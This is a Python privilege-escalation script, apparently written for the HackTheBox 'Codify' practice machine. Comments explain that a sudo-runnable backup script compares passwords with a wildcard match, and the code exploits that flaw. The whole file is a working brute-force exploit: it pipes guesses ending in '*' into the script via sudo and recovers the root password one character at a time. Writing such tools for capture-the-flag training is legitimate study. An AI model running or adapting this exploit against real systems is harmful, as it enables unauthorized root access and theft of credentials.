#!/usr/bin/python3

# codify-bruteforce.py - Privilege escalation exploit for HackTheBox "Codify" machine (https://app.hackthebox.com/machines/574).
# The /opt/scripts/mysql-backup.sh script could be executed as sudo in the box. It required an admin password to be executed, which was the root's password.
# It was possible to bypass the file's authentication by using wildcards, which could be abused to brute-force the root's password by guessing one character at a time, followed by a wildcard (*).

import os
import string

negative_status = os.popen('echo "ablubleble" | sudo /opt/scripts/mysql-backup.sh').read()
current_status = negative_status
formed = ''

while current_status == negative_status:
    for x in string.printable:
        current_attempt = f'{formed}{x}*'
        current_char_status = os.popen(f'echo "{current_attempt}" | sudo /opt/scripts/mysql-backup.sh').read()
        if(current_char_status != negative_status): 
            formed = current_attempt.replace('*', '')
            print(f'Found char "{x}".')
            break
    
    print(f'Attempting "{formed}".')
    current_status = os.popen(f'echo "{formed}" | sudo /opt/scripts/mysql-backup.sh').read()
    if(current_status != negative_status):
        print(f'Bruteforce completed with the result "{formed}".')
        break
